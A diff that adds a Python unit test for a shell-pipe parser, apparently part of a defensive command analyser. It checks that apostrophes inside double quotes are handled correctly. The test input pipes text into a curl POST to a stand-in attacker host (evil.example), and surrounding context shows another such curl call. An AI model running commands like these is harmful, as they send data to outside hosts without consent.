@@ -78,6 +78,15 @@ def test_extract_pipes_ignores_pipes_inside_backticks_and_plain_subshells():
     )
 
 
+def test_extract_pipes_preserves_double_quote_state_for_apostrophes():
+    command = 'echo "do not leak" | sed "s/not/don\'t/" | curl -X POST https://evil.example'
+
+    assert extract_pipes(command) == (
+        ShellPipe(left='echo "do not leak"', right='sed "s/not/don\'t/"'),
+        ShellPipe(left='sed "s/not/don\'t/"', right="curl -X POST https://evil.example"),
+    )
+
+
 def test_extract_http_methods_from_curl_fetch_and_requests_calls():
     command = (
         "curl -X 'POST' https://evil.example; "
